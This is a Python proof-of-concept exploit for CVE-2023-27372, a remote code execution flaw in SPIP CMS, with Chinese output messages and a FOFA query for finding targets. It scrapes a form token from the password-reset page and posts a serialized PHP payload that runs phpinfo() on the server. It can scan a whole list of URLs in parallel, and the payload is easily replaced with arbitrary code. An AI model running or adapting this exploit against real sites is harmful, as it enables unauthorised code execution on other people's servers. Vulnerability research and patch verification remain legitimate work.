#FOFA:app="SPIP"

import requests
import re
import argparse
import urllib3
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    try:
        res1 = requests.get(target, verify=False)
        if res1.status_code == 200:
            payload1 = "/spip.php?page=spip_pass"
            res2 = requests.get(target+payload1, verify=False)
            pattern = r'<input[^>]*name=["\']formulaire_action_args["\'][^>]*value=["\']([^"\']+)["\'][^>]*>'
            match = re.search(pattern, res2.text)
            value = match.group(1)
            data = {'page':'spip_pass','formulaire_action':'oubli','formulaire_action_args':f'{value}','oubli':'s:19:"<?php phpinfo(); ?>";','nobot':''}
            headers = {"User-Agent":"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)","Accept-Encoding":"gzip, deflate","Accept":"*/*","Connection":"close","Cookie":"cibcInit=oui","Content-Length":"215","Content-Type":"application/x-www-form-urlencoded"}
            res3 = requests.post(target+payload1, data=data, verify=False,headers=headers,proxies=proxy)
            if "PHP Version" in res3.text:
                print(f"{target}存在远程代码执行漏洞")
                print(res3.text)
            else:
                print(f"{target}不存在远程代码执行漏洞")


    except Exception as e:
        print(f"{target}网站访问失败，请手动确认")


def main():
    parser = argparse.ArgumentParser("CVE-2023-27372 SPIP CMS远程代码执行漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()